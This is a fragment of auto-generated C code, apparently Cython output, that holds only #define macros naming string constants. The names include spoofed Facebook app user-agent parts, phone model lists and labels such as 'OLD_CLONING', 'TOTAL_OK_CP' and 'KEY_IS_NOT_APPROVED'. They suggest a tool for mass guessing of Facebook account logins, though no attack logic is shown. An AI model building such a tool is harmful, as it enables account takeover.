#define __pyx_kp_u_38_5_244m_38_5_46m_PRESS_ENTER __pyx_mstate_global->__pyx_kp_u_38_5_244m_38_5_46m_PRESS_ENTER
#define __pyx_kp_u_38_5_244m_38_5_46m_THE_PROCESS __pyx_mstate_global->__pyx_kp_u_38_5_244m_38_5_46m_THE_PROCESS
#define __pyx_kp_u_38_5_244m_38_5_46m_TOTAL_ACCOUN __pyx_mstate_global->__pyx_kp_u_38_5_244m_38_5_46m_TOTAL_ACCOUN
#define __pyx_kp_u_38_5_244m_38_5_46m_TOTAL_OK_CP __pyx_mstate_global->__pyx_kp_u_38_5_244m_38_5_46m_TOTAL_OK_CP
#define __pyx_kp_u_38_5_244m_4 __pyx_mstate_global->__pyx_kp_u_38_5_244m_4
#define __pyx_kp_u_38_5_244m_5 __pyx_mstate_global->__pyx_kp_u_38_5_244m_5
#define __pyx_kp_s_38_5_244m_KEY_IS_NOT_APPROVED __pyx_mstate_global->__pyx_kp_s_38_5_244m_KEY_IS_NOT_APPROVED
#define __pyx_kp_s_38_5_46m __pyx_mstate_global->__pyx_kp_s_38_5_46m
#define __pyx_kp_s_38_5_47m __pyx_mstate_global->__pyx_kp_s_38_5_47m
#define __pyx_kp_s_38_5_48m __pyx_mstate_global->__pyx_kp_s_38_5_48m
#define __pyx_kp_s_38_5_49m __pyx_mstate_global->__pyx_kp_s_38_5_49m
#define __pyx_kp_s_38_5_50m __pyx_mstate_global->__pyx_kp_s_38_5_50m
#define __pyx_kp_u_38_5_81mCP_1_37m_38_5_81m __pyx_mstate_global->__pyx_kp_u_38_5_81mCP_1_37m_38_5_81m
#define __pyx_kp_s_38_5_86m __pyx_mstate_global->__pyx_kp_s_38_5_86m
#define __pyx_kp_s_38_5_8m __pyx_mstate_global->__pyx_kp_s_38_5_8m
#define __pyx_kp_u_3_38_5_244m_38_5_46m_OLD_CLONING __pyx_mstate_global->__pyx_kp_u_3_38_5_244m_38_5_46m_OLD_CLONING
#define __pyx_kp_s_4 __pyx_mstate_global->__pyx_kp_s_4
#define __pyx_kp_s_4YYU8 __pyx_mstate_global->__pyx_kp_s_4YYU8
#define __pyx_kp_s_5 __pyx_mstate_global->__pyx_kp_s_5
#define __pyx_kp_u_5 __pyx_mstate_global->__pyx_kp_u_5
#define __pyx_kp_u_537_36_Puffin_9_7_2 __pyx_mstate_global->__pyx_kp_u_537_36_Puffin_9_7_2
#define __pyx_kp_u_59 __pyx_mstate_global->__pyx_kp_u_59
#define __pyx_kp_s_6 __pyx_mstate_global->__pyx_kp_s_6
#define __pyx_kp_s_7 __pyx_mstate_global->__pyx_kp_s_7
#define __pyx_kp_s_708090 __pyx_mstate_global->__pyx_kp_s_708090
#define __pyx_kp_s_8 __pyx_mstate_global->__pyx_kp_s_8
#define __pyx_kp_s_9 __pyx_mstate_global->__pyx_kp_s_9
#define __pyx_kp_s_980 __pyx_mstate_global->__pyx_kp_s_980
#define __pyx_n_s_A __pyx_mstate_global->__pyx_n_s_A
#define __pyx_n_s_A525FXXU3AUG4 __pyx_mstate_global->__pyx_n_s_A525FXXU3AUG4
#define __pyx_n_s_A715FXXU3ATI8 __pyx_mstate_global->__pyx_n_s_A715FXXU3ATI8
#define __pyx_n_s_AM __pyx_mstate_global->__pyx_n_s_AM
#define __pyx_n_u_AP __pyx_mstate_global->__pyx_n_u_AP
#define __pyx_kp_u_AYYUB_CP_38_5_244m __pyx_mstate_global->__pyx_kp_u_AYYUB_CP_38_5_244m
#define __pyx_n_s_AYYUB_M1 __pyx_mstate_global->__pyx_n_s_AYYUB_M1
#define __pyx_n_s_AYYUB_M2 __pyx_mstate_global->__pyx_n_s_AYYUB_M2
#define __pyx_kp_s_Accept_Encoding __pyx_mstate_global->__pyx_kp_s_Accept_Encoding
#define __pyx_kp_s_Android __pyx_mstate_global->__pyx_kp_s_Android
#define __pyx_kp_u_AppleWebKit __pyx_mstate_global->__pyx_kp_u_AppleWebKit
#define __pyx_kp_u_AppleWebKit_534_30_KHTML_like_G __pyx_mstate_global->__pyx_kp_u_AppleWebKit_534_30_KHTML_like_G
#define __pyx_kp_u_AppleWebKit_537_36_KHTML_like_G __pyx_mstate_global->__pyx_kp_u_AppleWebKit_537_36_KHTML_like_G
#define __pyx_kp_s_AppleWebKit_537_36_KHTML_like_G_2 __pyx_mstate_global->__pyx_kp_s_AppleWebKit_537_36_KHTML_like_G_2
#define __pyx_kp_u_AppleWebKit_537_36_KHTML_like_G_3 __pyx_mstate_global->__pyx_kp_u_AppleWebKit_537_36_KHTML_like_G_3
#define __pyx_n_s_April __pyx_mstate_global->__pyx_n_s_April
#define __pyx_n_s_August __pyx_mstate_global->__pyx_n_s_August
#define __pyx_n_s_Authorization __pyx_mstate_global->__pyx_n_s_Authorization
#define __pyx_n_s_B __pyx_mstate_global->__pyx_n_s_B
#define __pyx_n_s_BD __pyx_mstate_global->__pyx_n_s_BD
#define __pyx_n_s_BD_locals_genexpr __pyx_mstate_global->__pyx_n_s_BD_locals_genexpr
#define __pyx_kp_s_Black_Shark __pyx_mstate_global->__pyx_kp_s_Black_Shark
#define __pyx_kp_s_Black_Shark_2 __pyx_mstate_global->__pyx_kp_s_Black_Shark_2
#define __pyx_kp_s_Black_Shark_3 __pyx_mstate_global->__pyx_kp_s_Black_Shark_3
#define __pyx_kp_s_Black_Shark_3S __pyx_mstate_global->__pyx_kp_s_Black_Shark_3S
#define __pyx_kp_s_Black_Shark_4 __pyx_mstate_global->__pyx_kp_s_Black_Shark_4
#define __pyx_kp_s_Black_Shark_4_Pro __pyx_mstate_global->__pyx_kp_s_Black_Shark_4_Pro
#define __pyx_kp_s_Black_Shark_5 __pyx_mstate_global->__pyx_kp_s_Black_Shark_5
#define __pyx_kp_s_Black_Shark_5_Pro __pyx_mstate_global->__pyx_kp_s_Black_Shark_5_Pro
#define __pyx_kp_s_Black_Shark_Helo __pyx_mstate_global->__pyx_kp_s_Black_Shark_Helo
#define __pyx_kp_s_Build __pyx_mstate_global->__pyx_kp_s_Build
#define __pyx_kp_u_Build __pyx_mstate_global->__pyx_kp_u_Build
#define __pyx_kp_u_Build_PPR1 __pyx_mstate_global->__pyx_kp_u_Build_PPR1
#define __pyx_n_s_C __pyx_mstate_global->__pyx_n_s_C
#define __pyx_n_s_CPH1801 __pyx_mstate_global->__pyx_n_s_CPH1801
#define __pyx_n_s_CPH1803 __pyx_mstate_global->__pyx_n_s_CPH1803
#define __pyx_n_s_CPH1805 __pyx_mstate_global->__pyx_n_s_CPH1805
#define __pyx_n_s_CPH1809 __pyx_mstate_global->__pyx_n_s_CPH1809
#define __pyx_n_s_CPH1827 __pyx_mstate_global->__pyx_n_s_CPH1827
#define __pyx_n_s_CPH1837 __pyx_mstate_global->__pyx_n_s_CPH1837
#define __pyx_n_s_CPH1851 __pyx_mstate_global->__pyx_n_s_CPH1851
#define __pyx_n_s_CPH1853 __pyx_mstate_global->__pyx_n_s_CPH1853
#define __pyx_n_s_CPH1979 __pyx_mstate_global->__pyx_n_s_CPH1979
#define __pyx_n_s_CPH1983 __pyx_mstate_global->__pyx_n_s_CPH1983
#define __pyx_n_s_CPH1987 __pyx_mstate_global->__pyx_n_s_CPH1987
#define __pyx_n_s_CPH2005 __pyx_mstate_global->__pyx_n_s_CPH2005
#define __pyx_n_s_CPH2009 __pyx_mstate_global->__pyx_n_s_CPH2009
#define __pyx_n_s_CPH2015 __pyx_mstate_global->__pyx_n_s_CPH2015
#define __pyx_n_s_CPH2059 __pyx_mstate_global->__pyx_n_s_CPH2059
#define __pyx_n_s_CPH2061 __pyx_mstate_global->__pyx_n_s_CPH2061
#define __pyx_n_s_CPH2065 __pyx_mstate_global->__pyx_n_s_CPH2065
#define __pyx_n_s_CPH2069 __pyx_mstate_global->__pyx_n_s_CPH2069
#define __pyx_n_s_CPH2071 __pyx_mstate_global->__pyx_n_s_CPH2071
#define __pyx_n_s_CPH2073 __pyx_mstate_global->__pyx_n_s_CPH2073
#define __pyx_n_s_CPH2077 __pyx_mstate_global->__pyx_n_s_CPH2077
#define __pyx_n_s_CPH2091 __pyx_mstate_global->__pyx_n_s_CPH2091
#define __pyx_n_s_CPH2095 __pyx_mstate_global->__pyx_n_s_CPH2095
#define __pyx_n_s_CPH2099 __pyx_mstate_global->__pyx_n_s_CPH2099
#define __pyx_n_s_CPH2137 __pyx_mstate_global->__pyx_n_s_CPH2137
#define __pyx_n_s_CPH2139 __pyx_mstate_global->__pyx_n_s_CPH2139
#define __pyx_n_s_CPH2145 __pyx_mstate_global->__pyx_n_s_CPH2145
#define __pyx_n_s_CPH2161 __pyx_mstate_global->__pyx_n_s_CPH2161
#define __pyx_n_s_CPH2185 __pyx_mstate_global->__pyx_n_s_CPH2185
#define __pyx_n_s_CPH2201 __pyx_mstate_global->__pyx_n_s_CPH2201
#define __pyx_n_s_CPH2209 __pyx_mstate_global->__pyx_n_s_CPH2209
#define __pyx_kp_u_Chrome __pyx_mstate_global->__pyx_kp_u_Chrome
#define __pyx_n_s_Civi __pyx_mstate_global->__pyx_n_s_Civi
#define __pyx_kp_s_Civi_2 __pyx_mstate_global->__pyx_kp_s_Civi_2
#define __pyx_n_s_ConnectionError __pyx_mstate_global->__pyx_n_s_ConnectionError
#define __pyx_kp_s_Content_Type __pyx_mstate_global->__pyx_kp_s_Content_Type
#define __pyx_n_s_D __pyx_mstate_global->__pyx_n_s_D
#define __pyx_kp_s_Davik_2_1_0_Linux_U_Android __pyx_mstate_global->__pyx_kp_s_Davik_2_1_0_Linux_U_Android
#define __pyx_n_s_December __pyx_mstate_global->__pyx_n_s_December
#define __pyx_n_s_Devember __pyx_mstate_global->__pyx_n_s_Devember
#define __pyx_n_s_EPE54B __pyx_mstate_global->__pyx_n_s_EPE54B
#define __pyx_n_s_EX __pyx_mstate_global->__pyx_n_s_EX
#define __pyx_n_s_EXCELLENT __pyx_mstate_global->__pyx_n_s_EXCELLENT
#define __pyx_n_s_F916BXXU1BTKF __pyx_mstate_global->__pyx_n_s_F916BXXU1BTKF
#define __pyx_n_s_FB4A __pyx_mstate_global->__pyx_n_s_FB4A
#define __pyx_kp_s_FBAN __pyx_mstate_global->__pyx_kp_s_FBAN
#define __pyx_kp_s_FBAN_FB4A_FBAV __pyx_mstate_global->__pyx_kp_s_FBAN_FB4A_FBAV
#define __pyx_kp_s_FBAN_FB4A_FBAV_59_0_0_15_313_FB __pyx_mstate_global->__pyx_kp_s_FBAN_FB4A_FBAV_59_0_0_15_313_FB
#define __pyx_kp_s_FBAN_FB4A_FBAV_59_0_0_15_313_FB_2 __pyx_mstate_global->__pyx_kp_s_FBAN_FB4A_FBAV_59_0_0_15_313_FB_2
#define __pyx_kp_s_FBAV __pyx_mstate_global->__pyx_kp_s_FBAV
#define __pyx_kp_s_FBBD __pyx_mstate_global->__pyx_kp_s_FBBD
#define __pyx_kp_s_FBBV __pyx_mstate_global->__pyx_kp_s_FBBV
#define __pyx_kp_s_FBCR __pyx_mstate_global->__pyx_kp_s_FBCR
#define __pyx_kp_s_FBDM_density_2_625_width_1080_h __pyx_mstate_global->__pyx_kp_s_FBDM_density_2_625_width_1080_h
#define __pyx_kp_s_FBDV __pyx_mstate_global->__pyx_kp_s_FBDV
#define __pyx_kp_s_FBMF __pyx_mstate_global->__pyx_kp_s_FBMF
#define __pyx_kp_s_FBOP_19_FBCA __pyx_mstate_global->__pyx_kp_s_FBOP_19_FBCA
#define __pyx_kp_s_FBPN __pyx_mstate_global->__pyx_kp_s_FBPN
#define __pyx_kp_s_FBRV __pyx_mstate_global->__pyx_kp_s_FBRV
#define __pyx_kp_s_FBSV __pyx_mstate_global->__pyx_kp_s_FBSV
#define __pyx_n_s_February __pyx_mstate_global->__pyx_n_s_February
#define __pyx_n_s_FileNotFoundError __pyx_mstate_global->__pyx_n_s_FileNotFoundError
#define __pyx_n_s_First __pyx_mstate_global->__pyx_n_s_First
#define __pyx_n_s_G __pyx_mstate_global->__pyx_n_s_G
#define __pyx_n_s_G1 __pyx_mstate_global->__pyx_n_s_G1
#define __pyx_n_s_G2 __pyx_mstate_global->__pyx_n_s_G2
#define __pyx_n_s_G3 __pyx_mstate_global->__pyx_n_s_G3
#define __pyx_n_s_G4 __pyx_mstate_global->__pyx_n_s_G4
#define __pyx_n_s_G5 __pyx_mstate_global->__pyx_n_s_G5
#define __pyx_n_s_G950FXXS5DSF1 __pyx_mstate_global->__pyx_n_s_G950FXXS5DSF1
#define __pyx_n_s_G950FXXS6DTA1 __pyx_mstate_global->__pyx_n_s_G950FXXS6DTA1
#define __pyx_n_s_G950FXXS8DTC6 __pyx_mstate_global->__pyx_n_s_G950FXXS8DTC6
#define __pyx_n_s_G950FXXU3CRGH __pyx_mstate_global->__pyx_n_s_G950FXXU3CRGH
#define __pyx_n_s_G950FXXU4DSBA __pyx_mstate_global->__pyx_n_s_G950FXXU4DSBA
#define __pyx_n_s_G975USQU4ETG1 __pyx_mstate_global->__pyx_n_s_G975USQU4ETG1
#define __pyx_n_s_G985FXXU7DTJ2 __pyx_mstate_global->__pyx_n_s_G985FXXU7DTJ2
#define __pyx_n_s_G998USQU1ATCU __pyx_mstate_global->__pyx_n_s_G998USQU1ATCU
#define __pyx_n_s_GET __pyx_mstate_global->__pyx_n_s_GET
#define __pyx_kp_s_GT_I9190 __pyx_mstate_global->__pyx_kp_s_GT_I9190
#define __pyx_kp_s_GT_I9192 __pyx_mstate_global->__pyx_kp_s_GT_I9192
#define __pyx_kp_s_GT_I9300 __pyx_mstate_global->__pyx_kp_s_GT_I9300
#define __pyx_kp_s_GT_I9300I __pyx_mstate_global->__pyx_kp_s_GT_I9300I
#define __pyx_kp_s_GT_I9301I __pyx_mstate_global->__pyx_kp_s_GT_I9301I
#define __pyx_kp_s_GT_I9500 __pyx_mstate_global->__pyx_kp_s_GT_I9500
#define __pyx_kp_s_GT_N5100 __pyx_mstate_global->__pyx_kp_s_GT_N5100
#define __pyx_kp_s_GT_N7100 __pyx_mstate_global->__pyx_kp_s_GT_N7100
#define __pyx_kp_s_GT_N8000 __pyx_mstate_global->__pyx_kp_s_GT_N8000
#define __pyx_kp_s_GT_P3110 __pyx_mstate_global->__pyx_kp_s_GT_P3110
#define __pyx_kp_s_GT_P5100 __pyx_mstate_global->__pyx_kp_s_GT_P5100
#define __pyx_kp_s_GT_P5110 __pyx_mstate_global->__pyx_kp_s_GT_P5110
#define __pyx_kp_s_GT_P5200 __pyx_mstate_global->__pyx_kp_s_GT_P5200
#define __pyx_kp_s_GT_P5210 __pyx_mstate_global->__pyx_kp_s_GT_P5210
#define __pyx_kp_s_GT_P5220 __pyx_mstate_global->__pyx_kp_s_GT_P5220
#define __pyx_kp_s_GT_S7390 __pyx_mstate_global->__pyx_kp_s_GT_S7390
#define __pyx_n_s_HLK75C __pyx_mstate_global->__pyx_n_s_HLK75C
#define __pyx_n_s_HLK75F __pyx_mstate_global->__pyx_n_s_HLK75F
#define __pyx_n_s_HLK75H __pyx_mstate_global->__pyx_n_s_HLK75H
#define __pyx_n_s_HRI83 __pyx_mstate_global->__pyx_n_s_HRI83
#define __pyx_n_s_Hongmi __pyx_mstate_global->__pyx_n_s_Hongmi
#define __pyx_kp_s_Hongmi_1S __pyx_mstate_global->__pyx_kp_s_Hongmi_1S
#define __pyx_kp_s_Hongmi_2 __pyx_mstate_global->__pyx_kp_s_Hongmi_2
#define __pyx_kp_s_Hongmi_2_3G __pyx_mstate_global->__pyx_kp_s_Hongmi_2_3G
#define __pyx_kp_s_Hongmi_2_4G __pyx_mstate_global->__pyx_kp_s_Hongmi_2_4G
#define __pyx_kp_s_Hongmi_4G __pyx_mstate_global->__pyx_kp_s_Hongmi_4G
#define __pyx_kp_s_Hongmi_Note_1TD __pyx_mstate_global->__pyx_kp_s_Hongmi_Note_1TD
#define __pyx_n_s_IML74K __pyx_mstate_global->__pyx_n_s_IML74K
#define __pyx_n_s_IMM76D __pyx_mstate_global->__pyx_n_s_IMM76D
#define __pyx_kp_s_Installing_missing_modules __pyx_mstate_global->__pyx_kp_s_Installing_missing_modules
#define __pyx_n_s_JDQ __pyx_mstate_global->__pyx_n_s_JDQ
#define __pyx_n_s_JDQ39 __pyx_mstate_global->__pyx_n_s_JDQ39
#define __pyx_n_s_JSS15J __pyx_mstate_global->__pyx_n_s_JSS15J
#define __pyx_n_s_JWR66L __pyx_mstate_global->__pyx_n_s_JWR66L
#define __pyx_n_s_JZO54K __pyx_mstate_global->__pyx_n_s_JZO54K
#define __pyx_n_s_January __pyx_mstate_global->__pyx_n_s_January
#define __pyx_n_s_July __pyx_mstate_global->__pyx_n_s_July
#define __pyx_n_s_June __pyx_mstate_global->__pyx_n_s_June
#define __pyx_kp_u_KHTML_like_Gecko_Chrome __pyx_mstate_global->__pyx_kp_u_KHTML_like_Gecko_Chrome
#define __pyx_kp_u_KHTML_like_Gecko_UCBrowser_79_0 __pyx_mstate_global->__pyx_kp_u_KHTML_like_Gecko_UCBrowser_79_0
#define __pyx_kp_u_KHTML_like_Gecko_Version __pyx_mstate_global->__pyx_kp_u_KHTML_like_Gecko_Version
#define __pyx_n_s_KOT4 __pyx_mstate_global->__pyx_n_s_KOT4
#define __pyx_n_s_KOT49H __pyx_mstate_global->__pyx_n_s_KOT49H
#define __pyx_n_s_KTU84P __pyx_mstate_global->__pyx_n_s_KTU84P
#define __pyx_n_s_LMY4 __pyx_mstate_global->__pyx_n_s_LMY4
#define __pyx_n_s_LMY47V __pyx_mstate_global->__pyx_n_s_LMY47V
#define __pyx_n_s_LMY48G __pyx_mstate_global->__pyx_n_s_LMY48G
#define __pyx_n_s_LMY48J __pyx_mstate_global->__pyx_n_s_LMY48J
#define __pyx_n_s_LRX22C __pyx_mstate_global->__pyx_n_s_LRX22C
#define __pyx_n_s_LRX22G __pyx_mstate_global->__pyx_n_s_LRX22G
#define __pyx_kp_s_LRX22G_2 __pyx_mstate_global->__pyx_kp_s_LRX22G_2
#define __pyx_n_s_Last __pyx_mstate_global->__pyx_n_s_Last
#define __pyx_n_s_Liger __pyx_mstate_global->__pyx_n_s_Liger
#define __pyx_kp_s_Log_In __pyx_mstate_global->__pyx_kp_s_Log_In
#define __pyx_n_s_M __pyx_mstate_global->__pyx_n_s_M
#define __pyx_n_u_M __pyx_mstate_global->__pyx_n_u_M
#define __pyx_n_s_M1 __pyx_mstate_global->__pyx_n_s_M1
#define __pyx_kp_u_M1_38_5_244m_38_5_244m __pyx_mstate_global->__pyx_kp_u_M1_38_5_244m_38_5_244m
#define __pyx_kp_u_M2_38_5_244m __pyx_mstate_global->__pyx_kp_u_M2_38_5_244m
#define __pyx_n_s_M3 __pyx_mstate_global->__pyx_n_s_M3
#define __pyx_n_s_M3s __pyx_mstate_global->__pyx_n_s_M3s
#define __pyx_kp_s_M5_Lite __pyx_mstate_global->__pyx_kp_s_M5_Lite
#define __pyx_kp_s_M6_Note __pyx_mstate_global->__pyx_kp_s_M6_Note
#define __pyx_n_s_MB526 __pyx_mstate_global->__pyx_n_s_MB526
#define __pyx_n_s_MDB08M __pyx_mstate_global->__pyx_n_s_MDB08M
#define __pyx_kp_s_MI_2 __pyx_mstate_global->__pyx_kp_s_MI_2
#define __pyx_kp_s_MI_3W __pyx_mstate_global->__pyx_kp_s_MI_3W
#define __pyx_kp_s_MI_4i __pyx_mstate_global->__pyx_kp_s_MI_4i
#define __pyx_kp_s_MI_5 __pyx_mstate_global->__pyx_kp_s_MI_5
#define __pyx_kp_s_MI_5X __pyx_mstate_global->__pyx_kp_s_MI_5X
#define __pyx_n_s_MMB29K __pyx_mstate_global->__pyx_n_s_MMB29K
#define __pyx_n_s_MMB29M __pyx_mstate_global->__pyx_n_s_MMB29M
#define __pyx_n_s_MMB29U __pyx_mstate_global->__pyx_n_s_MMB29U
#define __pyx_kp_s_MT6765_G_Series __pyx_mstate_global->__pyx_kp_s_MT6765_G_Series
#define __pyx_n_s_MX2 __pyx_mstate_global->__pyx_n_s_MX2
#define __pyx_n_s_MX380 __pyx_mstate_global->__pyx_n_s_MX380
#define __pyx_n_s_MX5 __pyx_mstate_global->__pyx_n_s_MX5
#define __pyx_kp_s_M_Bot_54 __pyx_mstate_global->__pyx_kp_s_M_Bot_54
#define __pyx_kp_s_M_Bot_60 __pyx_mstate_global->__pyx_kp_s_M_Bot_60
#define __pyx_n_s_Magic __pyx_mstate_global->__pyx_n_s_Magic
#define __pyx_kp_s_Maimang_5 __pyx_mstate_global->__pyx_kp_s_Maimang_5
#define __pyx_n_s_March __pyx_mstate_global->__pyx_n_s_March
#define __pyx_kp_s_Mate_10_Lite_Dual_SIM __pyx_mstate_global->__pyx_kp_s_Mate_10_Lite_Dual_SIM
#define __pyx_kp_s_Mate_20_X_China __pyx_mstate_global->__pyx_kp_s_Mate_20_X_China
#define __pyx_kp_s_Mate_8 __pyx_mstate_global->__pyx_kp_s_Mate_8
#define __pyx_n_s_May __pyx_mstate_global->__pyx_n_s_May
#define __pyx_kp_s_Medias_X __pyx_mstate_global->__pyx_kp_s_Medias_X
#define __pyx_n_s_Mi5 __pyx_mstate_global->__pyx_n_s_Mi5
#define __pyx_kp_s_MiTV_4A __pyx_mstate_global->__pyx_kp_s_MiTV_4A
#define __pyx_kp_s_MiTV_4A_Pro __pyx_mstate_global->__pyx_kp_s_MiTV_4A_Pro
#define __pyx_kp_s_MiTV_4C __pyx_mstate_global->__pyx_kp_s_MiTV_4C
#define __pyx_kp_s_MiTV_4I __pyx_mstate_global->__pyx_kp_s_MiTV_4I
#define __pyx_kp_s_MiTV_4S __pyx_mstate_global->__pyx_kp_s_MiTV_4S
#define __pyx_kp_s_MiTV_4X __pyx_mstate_global->__pyx_kp_s_MiTV_4X
#define __pyx_kp_s_MiTV_P1 __pyx_mstate_global->__pyx_kp_s_MiTV_P1
#define __pyx_kp_s_MiTV_Q1 __pyx_mstate_global->__pyx_kp_s_MiTV_Q1
#define __pyx_kp_s_MiTV_Stick __pyx_mstate_global->__pyx_kp_s_MiTV_Stick
#define __pyx_kp_s_MiTV_Stick_4K __pyx_mstate_global->__pyx_kp_s_MiTV_Stick_4K
#define __pyx_kp_s_Mi_4_LTE __pyx_mstate_global->__pyx_kp_s_Mi_4_LTE
#define __pyx_kp_s_Mi_A1 __pyx_mstate_global->__pyx_kp_s_Mi_A1
#define __pyx_kp_s_Mi_Box_4 __pyx_mstate_global->__pyx_kp_s_Mi_Box_4
#define __pyx_kp_s_Mi_CC9 __pyx_mstate_global->__pyx_kp_s_Mi_CC9
#define __pyx_kp_s_Mi_CC_9 __pyx_mstate_global->__pyx_kp_s_Mi_CC_9
#define __pyx_kp_s_Mi_CC_9_Pro __pyx_mstate_global->__pyx_kp_s_Mi_CC_9_Pro
#define __pyx_kp_s_Mi_CC_9e __pyx_mstate_global->__pyx_kp_s_Mi_CC_9e
#define __pyx_kp_s_Mi_Cancro __pyx_mstate_global->__pyx_kp_s_Mi_Cancro
#define __pyx_kp_s_Mi_Laser_Projector_150 __pyx_mstate_global->__pyx_kp_s_Mi_Laser_Projector_150
#define __pyx_kp_s_Mi_MAX2 __pyx_mstate_global->__pyx_kp_s_Mi_MAX2
#define __pyx_kp_s_Mi_Max __pyx_mstate_global->__pyx_kp_s_Mi_Max
#define __pyx_kp_s_Mi_Max3 __pyx_mstate_global->__pyx_kp_s_Mi_Max3
#define __pyx_kp_s_Mi_Max_2 __pyx_mstate_global->__pyx_kp_s_Mi_Max_2
#define __pyx_kp_s_Mi_Max_3 __pyx_mstate_global->__pyx_kp_s_Mi_Max_3
#define __pyx_kp_s_Mi_Mix __pyx_mstate_global->__pyx_kp_s_Mi_Mix
#define __pyx_kp_s_Mi_Mix_2 __pyx_mstate_global->__pyx_kp_s_Mi_Mix_2
#define __pyx_kp_s_Mi_Mix_2S __pyx_mstate_global->__pyx_kp_s_Mi_Mix_2S
#define __pyx_kp_s_Mi_Mix_3 __pyx_mstate_global->__pyx_kp_s_Mi_Mix_3
#define __pyx_kp_s_Mi_Mix_3_5G __pyx_mstate_global->__pyx_kp_s_Mi_Mix_3_5G
#define __pyx_kp_s_Mi_Mix_4 __pyx_mstate_global->__pyx_kp_s_Mi_Mix_4
#define __pyx_kp_s_Mi_Mix_Fold __pyx_mstate_global->__pyx_kp_s_Mi_Mix_Fold
#define __pyx_kp_s_Mi_Note10 __pyx_mstate_global->__pyx_kp_s_Mi_Note10
#define __pyx_kp_s_Mi_Note5 __pyx_mstate_global->__pyx_kp_s_Mi_Note5
#define __pyx_kp_s_Mi_Note_10 __pyx_mstate_global->__pyx_kp_s_Mi_Note_10
#define __pyx_kp_s_Mi_Note_10_Lite __pyx_mstate_global->__pyx_kp_s_Mi_Note_10_Lite
#define __pyx_kp_s_Mi_Note_10_Pro __pyx_mstate_global->__pyx_kp_s_Mi_Note_10_Pro
#define __pyx_kp_s_Mi_Note_11 __pyx_mstate_global->__pyx_kp_s_Mi_Note_11
#define __pyx_kp_s_Mi_Note_2 __pyx_mstate_global->__pyx_kp_s_Mi_Note_2
#define __pyx_kp_s_Mi_Note_3 __pyx_mstate_global->__pyx_kp_s_Mi_Note_3
#define __pyx_kp_s_Mi_Note_8 __pyx_mstate_global->__pyx_kp_s_Mi_Note_8
#define __pyx_kp_s_Mi_Note_LTE __pyx_mstate_global->__pyx_kp_s_Mi_Note_LTE
#define __pyx_kp_s_Mi_Note_Pro __pyx_mstate_global->__pyx_kp_s_Mi_Note_Pro
#define __pyx_kp_s_Mi_One __pyx_mstate_global->__pyx_kp_s_Mi_One
#define __pyx_kp_s_Mi_One_C1 __pyx_mstate_global->__pyx_kp_s_Mi_One_C1
#define __pyx_kp_s_Mi_One_Plus __pyx_mstate_global->__pyx_kp_s_Mi_One_Plus
#define __pyx_kp_s_Mi_Pad __pyx_mstate_global->__pyx_kp_s_Mi_Pad
#define __pyx_kp_s_Mi_Pad4 __pyx_mstate_global->__pyx_kp_s_Mi_Pad4
#define __pyx_kp_s_Mi_Pad5 __pyx_mstate_global->__pyx_kp_s_Mi_Pad5
#define __pyx_kp_s_Mi_Pad_2 __pyx_mstate_global->__pyx_kp_s_Mi_Pad_2
#define __pyx_kp_s_Mi_Pad_3 __pyx_mstate_global->__pyx_kp_s_Mi_Pad_3
#define __pyx_kp_s_Mi_Pad_4 __pyx_mstate_global->__pyx_kp_s_Mi_Pad_4
#define __pyx_kp_s_Mi_Pad_4_Plus __pyx_mstate_global->__pyx_kp_s_Mi_Pad_4_Plus
#define __pyx_kp_s_Mi_Pad_5 __pyx_mstate_global->__pyx_kp_s_Mi_Pad_5
#define __pyx_kp_s_Mi_Pad_5_Pro __pyx_mstate_global->__pyx_kp_s_Mi_Pad_5_Pro
#define __pyx_kp_s_Mi_Pad_5_Pro_5G __pyx_mstate_global->__pyx_kp_s_Mi_Pad_5_Pro_5G
#define __pyx_kp_s_Mi_Play __pyx_mstate_global->__pyx_kp_s_Mi_Play
#define __pyx_kp_s_Mi_XL __pyx_mstate_global->__pyx_kp_s_Mi_XL
#define __pyx_n_s_Milestone __pyx_mstate_global->__pyx_n_s_Milestone
#define __pyx_n_s_Miracle __pyx_mstate_global->__pyx_n_s_Miracle
#define __pyx_kp_s_Mix_Fold_2 __pyx_mstate_global->__pyx_kp_s_Mix_Fold_2
#define __pyx_kp_u_Mobile_Safari __pyx_mstate_global->__pyx_kp_u_Mobile_Safari
#define __pyx_kp_u_Mobile_Safari_537_36_XiaoMi_Miu __pyx_mstate_global->__pyx_kp_u_Mobile_Safari_537_36_XiaoMi_Miu
#define __pyx_n_s_ModuleNotFoundError __pyx_mstate_global->__pyx_n_s_ModuleNotFoundError
#define __pyx_kp_s_Moment_Sprint __pyx_mstate_global->__pyx_kp_s_Moment_Sprint
#define __pyx_n_s_Monza __pyx_mstate_global->__pyx_n_s_Monza
#define __pyx_kp_s_Motion_Plus __pyx_mstate_global->__pyx_kp_s_Motion_Plus
#define __pyx_kp_s_Moto_C __pyx_mstate_global->__pyx_kp_s_Moto_C
#define __pyx_kp_s_Moto_E2_4G_LTE __pyx_mstate_global->__pyx_kp_s_Moto_E2_4G_LTE
#define __pyx_kp_s_Moto_E3_Power __pyx_mstate_global->__pyx_kp_s_Moto_E3_Power
#define __pyx_kp_s_Moto_E4 __pyx_mstate_global->__pyx_kp_s_Moto_E4
#define __pyx_kp_s_Moto_E4_Plus __pyx_mstate_global->__pyx_kp_s_Moto_E4_Plus
#define __pyx_kp_s_Moto_E5 __pyx_mstate_global->__pyx_kp_s_Moto_E5
#define __pyx_kp_s_Moto_E5_Plus __pyx_mstate_global->__pyx_kp_s_Moto_E5_Plus
#define __pyx_kp_s_Moto_G __pyx_mstate_global->__pyx_kp_s_Moto_G
#define __pyx_kp_s_Moto_G3 __pyx_mstate_global->__pyx_kp_s_Moto_G3
#define __pyx_kp_s_Moto_G3_Turbo_Edition __pyx_mstate_global->__pyx_kp_s_Moto_G3_Turbo_Edition
#define __pyx_kp_s_Moto_G4 __pyx_mstate_global->__pyx_kp_s_Moto_G4
#define __pyx_kp_s_Moto_G5_Plus __pyx_mstate_global->__pyx_kp_s_Moto_G5_Plus
#define __pyx_kp_s_Moto_G5s __pyx_mstate_global->__pyx_kp_s_Moto_G5s
#define __pyx_kp_s_Moto_G5s_Plus __pyx_mstate_global->__pyx_kp_s_Moto_G5s_Plus
#define __pyx_kp_s_Moto_G6 __pyx_mstate_global->__pyx_kp_s_Moto_G6
#define __pyx_kp_s_Moto_G_2nd_Gen __pyx_mstate_global->__pyx_kp_s_Moto_G_2nd_Gen
#define __pyx_kp_s_Moto_G_Play __pyx_mstate_global->__pyx_kp_s_Moto_G_Play
#define __pyx_kp_s_Moto_X __pyx_mstate_global->__pyx_kp_s_Moto_X
